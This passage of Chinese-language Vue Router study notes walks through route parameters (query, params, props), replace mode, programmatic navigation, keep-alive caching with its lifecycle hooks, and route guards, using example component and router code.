<font style="color:#595959;">  },</font>

第二步：使用name，简化to的写法

<font style="color:#595959;">  <!-- 二级导航 --></font>

<font style="color:#595959;">    <div class="subNav"></font>

<font style="color:#595959;">      </font>

<font style="color:#595959;">      <!-- 二级路由在使用时，必须把路径写完整 --></font>

<font style="color:#595959;">      <!-- to的写法一 路径完整形式--></font>

<font style="color:#595959;">      <!-- <router-link to="/home/hot"> --></font>

<font style="color:#595959;">      <!-- to的写法二 对象形式，对象里面放路径--></font>

<font style="color:#595959;">      <!-- <router-link :to="{path:'/home/hot'}"> --></font>

<font style="color:#595959;">      <!-- to的写法三 对象形式，里面放路径名--></font>

<font style="color:#595959;">      <router-link :to="{ name: 'hot' }"></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <h5>正在热卖</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">      <router-link to="/home/agree"></font>

<font style="color:#595959;">        <h5>值得推荐</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">      <router-link to="/home/more"></font>

<font style="color:#595959;">        <h5>查看更多</h5></font>

<font style="color:#595959;">      </router-link></font>

<font style="color:#595959;">    </div></font>

## 6.6 路由query传参 
为了提高组件的复用性，可以<font style="color:#DF2A3F;">给路由组件传参</font>，URL的查询参数，？开头，&分割多个

传递参数：哪里点击跳转，在哪里传参数

需求：根据电影列表信息，点击不同的电影，查看不同的详情页面

第一步：配置好详情页组件

views/detail.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>detail</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    // 接收传递参数</font>

<font style="color:#595959;">    mounted(){</font>

<font style="color:#595959;">        // 当前的路由信息，this.$route.query</font>

<font style="color:#595959;">        console.log(this.$route.query,'route');</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

第二步：router/index.js

<font style="color:#595959;">routes: [</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">        //路由重定向</font>

<font style="color:#595959;">        path: '/',//初始路径</font>

<font style="color:#595959;">        redirect: '/home/hot'</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">        path:'/detail',</font>

<font style="color:#595959;">        name:'detail',</font>

<font style="color:#595959;">        component:Detail</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  //·····</font>

第三步：传递参数，哪里点击，哪里传递

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <ul></font>

<font style="color:#595959;">      <li v-for="film in films" :key="film.filmId"></font>

<font style="color:#595959;">        <!-- query传参</font>

<font style="color:#595959;">         to="/路由路径?参数名=参数值&参数名=参数值"</font>

<font style="color:#595959;">        --></font>

<font style="color:#595959;">        <!-- 1、传递静态参数 --></font>

<font style="color:#595959;">        <!-- <router-link  to="/detail?filmId=123" class="film"> --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <!-- 2、传递从data中读取的参数 --></font>

<font style="color:#595959;">        <!-- <router-link  :to="`/detail?filmId=${num}`" class="film"> --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <!-- 3、传递遍历的参数 --></font>

<font style="color:#595959;">        <!-- <router-link :to="`/detail?filmId=${film.filmId}&num=${num}`" class="film"> --></font>

<font style="color:#595959;">       </font>

<font style="color:#595959;">        <!-- 4、以对象的方式传递参数 --></font>

<font style="color:#595959;">        <!-- :to="{</font>

<font style="color:#595959;">          // path: '/detail',</font>

<font style="color:#595959;">          name: 'detail',</font>

<font style="color:#595959;">          query: {</font>

<font style="color:#595959;">            filmId: film.filmId,</font>

<font style="color:#595959;">            num: num</font>

<font style="color:#595959;">          }</font>

<font style="color:#595959;">        }" --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <router-link :to="{</font>

<font style="color:#595959;">          // path: '/detail',</font>

<font style="color:#595959;">          name: 'detail',</font>

<font style="color:#595959;">          query: {</font>

<font style="color:#595959;">            filmId: film.filmId,</font>

<font style="color:#595959;">            num: num</font>

<font style="color:#595959;">          }</font>

<font style="color:#595959;">        }" class="film"></font>

<font style="color:#595959;">          <img :src="film.poster" alt="" style="width: 100px;"></font>

<font style="color:#595959;">          {{ film.name }}</font>

<font style="color:#595959;">        </router-link></font>

<font style="color:#595959;">      </li></font>

<font style="color:#595959;">    </ul></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>

第四步：拿取数据

拿到detail组件的路由 <font style="color:#DF2A3F;">this.$route.query ,里面就有传递的参数</font>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>detail：{{ filmId }}</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            filmId: ''</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    // 接收传递参数</font>

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        // 当前的路由信息</font>

<font style="color:#595959;">        console.log(this.$route.query, 'route');</font>

<font style="color:#595959;">        this.filmId = this.$route.query.filmId</font>

<font style="color:#595959;">        console.log(`通过filmId：${this.filmId}请求数据，进行展示`);</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 6.7 路由params传参 
第一步：新建好detail组件，并配置好路由关系 

如果是<u>采用</u><u><font style="color:#DF2A3F;">to传递字符串</font></u><u>的形式拼接参数</u>： <font style="color:#DF2A3F;">to='路径名/参数1/参数2'</font> ，<u>必须在route/index.js中路径处</u><u><font style="color:#DF2A3F;">进行参数占位</font></u>

/.../....的形式传参

<font style="color:#595959;">{</font>

<font style="color:#595959;">            // params传递，必须在路由后进行参数占位</font>

<font style="color:#595959;">            path:'/detail/:filmId/:num2',</font>

<font style="color:#595959;">            name: 'detail',</font>

<font style="color:#595959;">            component: Detail</font>

<font style="color:#595959;">        },</font>

如果是<font style="color:#DF2A3F;">to传递对象</font>的形式：<font style="color:#DF2A3F;">可以不占位</font>

<font style="color:#595959;">{</font>

<font style="color:#595959;">            // params传递，必须在路由后进行参数占位</font>

<font style="color:#595959;">            // path:'/detail/:filmId/:num2',</font>

<font style="color:#595959;">            // 如果是对象的形式传参，就不需要占位</font>

<font style="color:#595959;">            path: '/detail',</font>

<font style="color:#595959;">            name: 'detail',</font>

<font style="color:#595959;">            component: Detail</font>

<font style="color:#595959;">        },</font>

第二步：传递参数

哪里点击，哪里传递参数

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <ul></font>

<font style="color:#595959;">      <li v-for="film in films" :key="film.filmId"></font>

<font style="color:#595959;">        <!-- params传参</font>

<font style="color:#595959;">          to='路径名/参数1/参数2' </font>

<font style="color:#595959;">        --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <!-- 1、传递静态数据 --></font>

<font style="color:#595959;">        <!-- <router-link to="/detail/123/456" class="film"> --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <!-- 2、传递动态的数据 --></font>

<font style="color:#595959;">        <!-- <router-link :to="`/detail/${film.filmId}/456`" class="film"> --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <!-- 3、传递参数：对象的形式，不能用path，必须用name --></font>

<font style="color:#595959;">        <!-- :to="{</font>

<font style="color:#595959;">          // path: '/detail',</font>

<font style="color:#595959;">          name: 'detail',</font>

<font style="color:#595959;">          params: {</font>

<font style="color:#595959;">            filmId: film.filmId,</font>

<font style="color:#595959;">            num2: 456</font>

<font style="color:#595959;">          }</font>



<font style="color:#595959;">        }" --></font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        <router-link :to="{</font>

<font style="color:#595959;">          // path: '/detail',</font>

<font style="color:#595959;">          name: 'detail',</font>

<font style="color:#595959;">          params: {</font>

<font style="color:#595959;">            filmId: film.filmId,</font>

<font style="color:#595959;">            num2: 456</font>

<font style="color:#595959;">          }</font>



<font style="color:#595959;">        }" class="film"></font>

<font style="color:#595959;">          <img :src="film.poster" alt="" style="width: 100px;"></font>

<font style="color:#595959;">          {{ film.name }}</font>

<font style="color:#595959;">        </router-link></font>

<font style="color:#595959;">      </li></font>

<font style="color:#595959;">    </ul></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>

第三步：detail组件接收参数

拿到当前组件的路由关系：<font style="color:#DF2A3F;">this.$route.params</font>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>detail：{{ filmId }}</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            filmId: ''</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    // 接收传递参数</font>

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        // 当前的路由信息</font>

<font style="color:#595959;">        console.log(this.$route.params);</font>

<font style="color:#595959;">        this.filmId=this.$route.params.filmId</font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        // console.log(`通过filmId：${this.filmId}请求数据，进行展示`);</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 6.8 <font style="color:#000000;">路由的props </font>
props配置主要是为了<u>简化query和params参数的接收</u>。让插值语法更加简洁。

<u>哪个组件接收参数，就在哪个组件</u><u><font style="color:#DF2A3F;">路由关系</font></u><u>中配置props</u>

<font style="color:#DF2A3F;">三种写法：对象，函数，布尔值写法</font>

+ 对象写法：适合传递固定值（与路由参数无关，哪种都可）。
+ 函数写法：适合动态处理路由参数（如 params/query 转换或组合）。
+ 布尔值写法：适合简单场景，直接将 params 注入组件（不支持 query）。



<font style="color:#595959;">// 创建路由器对象（在路由器对象中配置路由）</font>

<font style="color:#595959;">const router = new VueRouter({</font>

<font style="color:#595959;">  routes: [</font>

<font style="color:#595959;">    // 路由1</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      name: "sub1",</font>

<font style="color:#595959;">      path: "/subject1/:a1/:a2/:a3",</font>

<font style="color:#595959;">      component: subject,</font>

<font style="color:#595959;">      //第一种写法，对象的写法。只能传递固定值</font>

<font style="color:#595959;">      // props: { </font>

<font style="color:#595959;">      //   x: "章三",</font>

<font style="color:#595959;">      //   y: "李四",</font>

<font style="color:#595959;">      //   z: "王二麻",</font>

<font style="color:#595959;">      // },</font>

<font style="color:#595959;">      //第二种写法：函数式，这里的$route就是当前路由，默认有$route参数</font>

<font style="color:#595959;">      // props($route) {</font>

<font style="color:#595959;">      //   return {</font>

<font style="color:#595959;">      //     a1: $route.params.a1,</font>

<font style="color:#595959;">      //     a2: $route.params.a2,</font>

<font style="color:#595959;">      //     a3: $route.params.a3,</font>

<font style="color:#595959;">      //   };</font>

<font style="color:#595959;">      // },</font>

<font style="color:#595959;">      //第三种写法：直接将params方式收到的数据转化为props，这种方式，只针对params传参</font>

<font style="color:#595959;">      props:true </font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      name: "sub2",</font>

<font style="color:#595959;">      path: "/subject2/:a1/:a2/:a3",</font>

<font style="color:#595959;">      component: subject,</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">});</font>

<font style="color:#595959;">// 暴露路由器对象</font>

<font style="color:#595959;">export default router;</font>

subject.vue props接收，直接可以使用

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <ul class="web"></font>

<font style="color:#595959;">            <li>{{ a1 }}</li></font>

<font style="color:#595959;">            <li>{{ a2 }}</li></font>

<font style="color:#595959;">            <li>{{ a3 }}</li></font>

<font style="color:#595959;">        </ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'web',</font>

<font style="color:#595959;">    // 接收路由器中配置的props，简写插值语法的写法，接受后才能用</font>

<font style="color:#595959;">    //props: ['x', 'y', 'z']</font>

<font style="color:#595959;">    props: ['a1', 'a2', 'a3']</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#595959;"><style></font>

<font style="color:#595959;">.web {</font>

<font style="color:#595959;">    background-color: pink;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

## 6.9 router-link的replace属性
### 6.9.1、栈数据结构，先进后出，后进先出原则
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433663869-6397bbfc-2f11-49a0-83dc-5e7aa0a21c1f.png)

### 6.9.2浏览器的历史记录是存储在栈这种数据结构当中的。包括两种模式：
(1) push模式（默认的）

(2) replace模式

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433664360-a4f22fc7-fac7-44f4-afd3-7b322b306e2a.png)

(3) 如何开启replace模式：

a.<router-link <font style="color:#DF2A3F;">:replace=”true”</font>/>

b. <router-link <font style="color:#DF2A3F;">replace</font> />

## 6.10 编程式路由导航 
需求中可能<u><font style="color:#000000;">不是通过点击超链接的方式切换路由</font></u>，也就是说不使用如何实现路由切换。

这种方式，我们叫声明式的路由导航

<u>声明式的路由导航指的是通过特定的语法或配置来实现路由的切换，而不是通过直接操作超链接等传统方式。</u>

通过编写代码，完成路由组件的切换，这种方式我们呢交编程式路由导航

声明式路由导航可以通过相关API来完成：

(1) push模式：

this.$router.push({

name : ‘’,

query : {}

})

(2) replace模式：

this.$router.replace({

name : ‘’,

query : {}

})

(3) 前进：

this.$router.forward()

(4) 后退：

this.$router.back()

(5) 前进或后退几步：

this.$router.go(2) 前进两步

this.$router.go(-2) 后退两步

(6) 使用编程式路由导航的时候，需要注意：

<u>重复执行push或者replace的API时</u>，会出现以下错误：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433664652-2e4d1de4-e03b-49d6-a084-0df34a550e97.png)这个问题是因为<u>push方法返回一个Promise对象</u>，期望你在调用push方法的时候传递两个回调函数，一个是成功的回调，一个是失败的回调，如果不传就会出以上的错误。所以解决以上问题只需要给push和replace方法在参数上<font style="color:#DF2A3F;">添加两个回调即可。</font>

<font style="color:#595959;"><button @click="$router.forward()">前进</button></font>

<font style="color:#595959;"><button @click="$router.go(1)">go-1</button></font>

<font style="color:#595959;"><button @click="$router.go(2)">go-2</button></font>

<font style="color:#595959;"><button @click="$router.back()">返回</button></font>

<font style="color:#595959;"><button @click="$router.go(-1)">go-1</button></font>

<font style="color:#595959;"><button @click="$router.go(-2)">go-2</button></font>

<font style="color:#595959;"><button @click="goDetail(film.filmId)">跳转详情页</button></font>

<font style="color:#595959;">//····</font>

<font style="color:#595959;"> goDetail(filmId) {</font>

<font style="color:#595959;">   //有历史记录</font>

<font style="color:#595959;">      this.$router.push({</font>

<font style="color:#595959;">        // path:'/detail',</font>

<font style="color:#595959;">        name: 'detail',</font>

<font style="color:#595959;">        params: {</font>

<font style="color:#595959;">          filmId: filmId,</font>

<font style="color:#595959;">          num2: 456</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">         query: {</font>

<font style="color:#595959;">          filmId: filmId,</font>

<font style="color:#595959;">          num2: 456</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">      }, () => { }, () => { })</font>

<font style="color:#595959;">   // 没有历史记录</font>

<font style="color:#595959;">      // this.$router.replace({</font>

<font style="color:#595959;">      //   // path:'/detail',</font>

<font style="color:#595959;">      //   name: 'detail',</font>

<font style="color:#595959;">      //   params: {</font>

<font style="color:#595959;">      //     filmId: filmId,</font>

<font style="color:#595959;">      //     num2: 456</font>

<font style="color:#595959;">      //   }</font>

<font style="color:#595959;">      // }, () => { }, () => { })</font>

<font style="color:#595959;">    }</font>

6.11 缓存路由组件

<u>默认情况下路由切换时，路由组件</u><u><font style="color:#DF2A3F;">会被销毁</font></u><u>。</u>有时需要在切换路由组件时保留组件（缓存起来）。

<font style="color:#DF2A3F;"><keep-alive>//会缓存所有的路由组件</font>

<router-view/>

<font style="color:#DF2A3F;"></keep-alive></font>

通过添加以下3种属性，控制路由组件的缓存

<font style="color:#555666;">include - </font>[<font style="color:#FC5531;">字符串</font>](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020" \t "_blank)<font style="color:#555666;">或正则表达式或变成动态的属性，解析数组。只有名称</font><font style="color:#DF2A3F;">匹配的组件会被缓存</font><font style="color:#555666;">。</font>  
<font style="color:#555666;">exclude - 字符串或</font>[<font style="color:#FC5531;">正则表达式</font>](https://so.csdn.net/so/search?q=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1001.2101.3001.7020" \t "_blank)<font style="color:#555666;">或变成动态的属性，解析数组。任何名称</font><font style="color:#DF2A3F;">匹配的组件都不会被缓存。</font>  
<font style="color:#555666;">max - </font><font style="color:#DF2A3F;">数字。最多可以缓存多少组件实例</font><font style="color:#555666;">。</font>

注意：<font style="color:#FC5531;">router</font><font style="color:#4D4D4D;">.js 中的name和vue</font><font style="color:#FC5531;">组件</font><font style="color:#4D4D4D;">的name需要保持一致</font>

<font style="color:#595959;"><div class="mycontent"></font>

<font style="color:#595959;">      <!-- 告诉路由器，路由组件显示在这个位置 --></font>

<font style="color:#595959;">      <!-- 1、只想news组件被缓存，其他组件切换时，还是被销毁  include--></font>

<font style="color:#595959;">      <!-- 2、除了car组件，其他组件都被销毁 exclude --></font>

<font style="color:#595959;">      <!-- <keep-alive include="news"> --></font>

<font style="color:#595959;">      <!-- <keep-alive :include="['news']"> --></font>

<font style="color:#595959;">      <keep-alive :exclude="['news']" ></font>

<font style="color:#595959;">        <router-view /></font>

<font style="color:#595959;">      </keep-alive></font>

<font style="color:#595959;">    </div></font>

## 6.12 activated和deactivated 
对于普通的组件来说，有8个生命周期函数，<u>对于路由组件， 除了常规的8个，额外还有2个</u>，

<font style="color:#C7254E;"><keep-alive></font><font style="color:#DF2A3F;">包裹的路由组件</font><font style="color:#4D4D4D;">，该组件有两个特有的生命周期函数：</font><font style="color:#C7254E;">activated</font><font style="color:#4D4D4D;">和</font><font style="color:#C7254E;">deactivated</font><font style="color:#4D4D4D;">。</font>

<font style="color:#C7254E;">activated</font><font style="color:#4D4D4D;">在路由组件</font><font style="color:#DF2A3F;">被激活时触发</font><font style="color:#4D4D4D;">；</font>

<font style="color:#C7254E;">deactivated</font><font style="color:#4D4D4D;">在路由组件</font><font style="color:#DF2A3F;">失活时触发</font><font style="color:#4D4D4D;">。</font>

这两个钩子函数的作用是<u>捕获路由组件的激活状态。</u>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433664920-b19c089b-f30c-43d7-a626-d7bcba1c2d94.png)

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <ul class="web"></font>

<font style="color:#595959;">            <li><input type="checkbox">html</li></font>

<font style="color:#595959;">            <li><input type="checkbox">css</li></font>

<font style="color:#595959;">            <li><input type="checkbox">js</li></font>

<font style="color:#595959;">        </ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">// 需求：当组件切换到subject1的时候，每隔1s，输出一句话‘工作中····’</font>

<font style="color:#595959;">// 当组件切走时，输出‘休息中····’,并解除定时器</font>

<font style="color:#595959;">// 正常情况下，这个功能可以用mounted和beforeDestroy去完成，但当subject1组件用keep-alive保持激活时，</font>

<font style="color:#595959;">// 就必须使用activated和deactivated组件了</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'subject1',</font>

<font style="color:#595959;">    // mounted() {</font>

<font style="color:#595959;">    //     this.timer = setInterval(() => {</font>

<font style="color:#595959;">    //         console.log('工作中····');</font>

<font style="color:#595959;">    //     }, 1000)</font>

<font style="color:#595959;">    // },</font>

<font style="color:#595959;">    // beforeDestroy() {</font>

<font style="color:#595959;">    //     console.log('休息中···');</font>

<font style="color:#595959;">    //     clearInterval(this.timer)</font>

<font style="color:#595959;">    // }</font>

<font style="color:#595959;">    // </font>

<font style="color:#595959;">    activated() {</font>

<font style="color:#595959;">        this.timer = setInterval(() => {</font>

<font style="color:#595959;">            console.log('工作中····');</font>

<font style="color:#595959;">        }, 1000)</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    deactivated() {</font>

<font style="color:#595959;">        clearInterval(this.timer)</font>

<font style="color:#595959;">        console.log('休息中');</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#595959;"><style></font>

<font style="color:#595959;">.web {</font>

<font style="color:#595959;">    background-color: pink;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"><</font>

## 6.13 路由守卫 
1、面试：有哪些路由守卫？

2、实际开发过程中，重点全局前置守卫 

不同的守卫其实就是在不同的时机，不同的位置，添加鉴权（鉴别权限）代码

### 6.13.1 全局前置守卫 
需求：只有当用户是admin时，允许切换到subject2路由上

1<font style="color:#DF2A3F;">、书写位置：在创建好router之后，以及暴露router之前</font>

2、执行时机：beforeEach()中传入一个回调函数callback，可以是普通函数或箭头函数都可以，<font style="color:#DF2A3F;">在初始化时执行一次</font>，然后每一次在<font style="color:#DF2A3F;">切换任意组件之前都会被调用</font>

router.beforeEach((to, from, next)=>{ // 翻译为：每次前（寓意：每一次切换任意路由之前执行。）

// to 去哪里(<font style="color:#FF0000;">to.path、to.name</font>)

// from 从哪来

// next 继续：调用next( )

})

3、callback函数有3个参数：to form next

from参数：from是一个路由对象，表示从哪里来（从那个路由切过来的），起点

to参数：to也是一个路由对象，表示到哪里去，终点

next参数：是一个函数，调用这个函数之后，<u>表示放行，可以继续向下走</u>

4、<u>给路由对象添加自定义属性的话，需要在</u><u><font style="color:#DF2A3F;">路由对象的meta</font></u><u>（路由元）中定义</u>

如果路由组件较多。to.path会比较繁琐，可以考虑给需要鉴权的路由扩展一个布尔值属性，可以通过路由元来定义属性：<font style="color:#FF0000;">meta:{isAuth : true}</font>

<font style="color:#595959;">// 创建路由器对象(配置一个个路由)</font>

<font style="color:#595959;">// 导入vue-router插件</font>

<font style="color:#595959;">import VueRouter from "vue-router";</font>

<font style="color:#595959;">// 导入组件</font>

<font style="color:#595959;">import subject1 from "../pages/subject1.vue";</font>

<font style="color:#595959;">import subject2 from "../pages/subject2.vue";</font>



<font style="color:#595959;">// 创建路由器对象（在路由器对象中配置路由）</font>

<font style="color:#595959;">const router = new VueRouter({</font>

<font style="color:#595959;">  routes: [</font>

<font style="color:#595959;">    // 路由1</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      name: "sub1",</font>

<font style="color:#595959;">      path: "/subject1",</font>

<font style="color:#595959;">      component: subject1,</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    // 路由2</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      name: "sub2",</font>

<font style="color:#595959;">      path: "/subject2",</font>

<font style="color:#595959;">      component: subject2,</font>

<font style="color:#595959;">      // 带有isAuth属性，并且属性值为ture的，需要鉴权</font>

<font style="color:#595959;">      meta: { isAuth: true },</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">});</font>

<font style="color:#595959;">// 全局前置路由守卫</font>

<font style="color:#595959;">// 1、书写位置：在创建好router之后，以及暴露router之前</font>

<font style="color:#595959;">// 2、执行时机：beforeEach()中传入一个回调函数callback，可以是普通函数或箭头函数都可以，</font>

<font style="color:#595959;">// 在初始化时执行一次，然后每一次在切换任意组件之前都会被调用</font>

<font style="color:#595959;">// 3、callback函数有3个参数：to form next</font>

<font style="color:#595959;">// from参数：from是一个路由对象，表示从哪里来（从那个路由切过来的），起点</font>

<font style="color:#595959;">// to参数：to也是一个路由对象，表示到哪里去，终点</font>

<font style="color:#595959;">// next参数：是一个函数，调用这个函数之后，表示放行，可以继续向下走</font>

<font style="color:#595959;">// 4、给路由对象添加自定义属性的话，需要在路由对象的meta（路由元）中定义</font>

<font style="color:#595959;">router.beforeEach((to, from, next) => {</font>

<font style="color:#595959;">  // console.log(to);</font>

<font style="color:#595959;">  // 需求：只有当用户是admin时，允许切换到subject2路由上</font>

<font style="color:#595959;">  let loginName = "admin1";</font>

<font style="color:#595959;">  //1、 判断路由组件的name</font>

<font style="color:#595959;">  // if (to.name == "sub2") {</font>

<font style="color:#595959;">  //2、 判断路由组件的path</font>

<font style="color:#595959;">  // if (to.path == "/subject2") {</font>

<font style="color:#595959;">  // 3、可以在路由对象中自定义个属性，需要鉴权的组件都加上ture，</font>

<font style="color:#595959;">  //不需要鉴权的，则是undefined，是false</font>

<font style="color:#595959;">  if (to.meta.isAuth) {</font>

<font style="color:#595959;">    if (loginName == "admin") {</font>

<font style="color:#595959;">      next();</font>

<font style="color:#595959;">    } else {</font>

<font style="color:#595959;">      alert("对不起，你没有权限");</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  } else {</font>

<font style="color:#595959;">    next();</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">});</font>



<font style="color:#595959;">// 暴露路由器对象</font>

<font style="color:#595959;">export default router;</font>

### 6.13.2 全局后置守卫 
需求： 每次切换完路由组件后，更换title标题栏，在meta中设置title属性属性值

1、书写位置：router/index.js文件中拿到router对象，<font style="color:#DF2A3F;">在创建router对象之后，暴露router对象之前写</font>

2、执行时机<font style="color:#DF2A3F;">：初始化执行一次，以后每一切换完任意路由之后</font>

3、参数：只有to,from,没有next，因为没有必要了

router.afterEach((to, from)=>{ // 翻译为：每次后（寓意：每一次切换路由后执行。）

// 没有 next

<font style="color:#DF2A3F;">document.title = to.meta.title // 通常使用后置守卫完成路由切换时title的切换。</font>

})

该功能也可以使用前置守卫实现：

<font style="color:#595959;">//需求： 每次切换完路由组件后，更换title标题栏，在meta中设置title属性属性值</font>

<font style="color:#595959;">// 书写位置：在创建router对象之后，暴露router对象之前</font>

<font style="color:#595959;">// 执行时机：初始化执行一次，以后每一切换完任意路由之后</font>

<font style="color:#595959;">// 参数：只有to,from,没有next，因为没有必要了</font>

<font style="color:#595959;">router.afterEach((to, from) => {</font>

<font style="color:#595959;">  document.title = to.meta.title || "欢迎使用";</font>

<font style="color:#595959;">});</font>

### 6.13.3 局部路由守卫之path守卫（路由守卫） 
beforeEnter(){} 

书写位置：<font style="color:#DF2A3F;">写在route对象中,与path同级</font>

执行时机：<font style="color:#DF2A3F;">进入到对应路由组件前被调用</font>

参数：to,from,next

<u>注意：没有afterEnter</u>

<font style="color:#595959;"> // 路由2</font>

<font style="color:#595959;">    {</font>

<font style="color:#595959;">      name: "sub2",</font>

<font style="color:#595959;">      path: "/subject2",</font>

<font style="color:#595959;">      component: subject2,</font>

<font style="color:#595959;">      // 带有isAuth属性，并且属性值为ture的，需要鉴权</font>

<font style="color:#595959;">      // meta: { isAuth: true, title: "subject2" },</font>

<font style="color:#595959;">      //进入到对应路由组件前被调用 </font>

<font style="color:#595959;">      beforeEnter(to, from, next) {</font>

<font style="color:#595959;">        let loginName = "admin1";</font>

<font style="color:#595959;">        if (loginName == "admin") {</font>

<font style="color:#595959;">          next();</font>

<font style="color:#595959;">        } else {</font>

<font style="color:#595959;">          alert("对不起，没有权限");</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">      },</font>

<font style="color:#595959;">    },</font>

### 6.13.4 局部路由守卫之component守卫（组件守卫） 
书写位置：<font style="color:#DF2A3F;">写在路由组件当中，也就是xxx.vue文件中</font>

执行时机： <font style="color:#DF2A3F;">beforeRouteEnter 进去路由组件之前执行</font>

<font style="color:#DF2A3F;">beforeRouteLeave 离开路由组件之前执行 </font>

注意：只有路由组件才有这两个钩子。

<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'subject2',</font>

<font style="color:#595959;">    // 进去路由组件之前执行</font>

<font style="color:#595959;">    beforeRouteEnter(to, from, next) {</font>

<font style="color:#595959;">        console.log(`进入路由组件之前“${to.meta.title}`);</font>

<font style="color:#595959;">        next()</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    // 离开路由组件之前执行</font>

<font style="color:#595959;">    beforeRouteLeave(to, from, next) {</font>

<font style="color:#595959;">        console.log(`离开路由组件之前“${from.meta.title}`);</font>

<font style="color:#595959;">        next()</font>



<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 6.14 前端项目打包
源代码xxx.vue对于浏览器来说，浏览器只认识html，css,js

xxx.vue需要使用项目构建工具完成打包编译

例如，可以使用webpack来打包编译，生成html，css，js,这些浏览器才能识别 

### 6.14.1、npm run build
1.、<u>路径中#后面的路径称为hash。这个hash不会作为路径的一部分发送给服务器</u>：

(1) http://localhost:8080/vue/bugs/#/a/b/c/d/e （真实请求的路径是：http://localhost:8080/vue/bugs）

2、路由的两种路径模式： hash模式和history模式的区别与选择

(1) hash模式

① 路径中带有#，<u>不美观</u>。

② <u>兼容性好</u>，低版本浏览器也能用。

③ 项目上线<u>刷新地址不会出现404</u>。

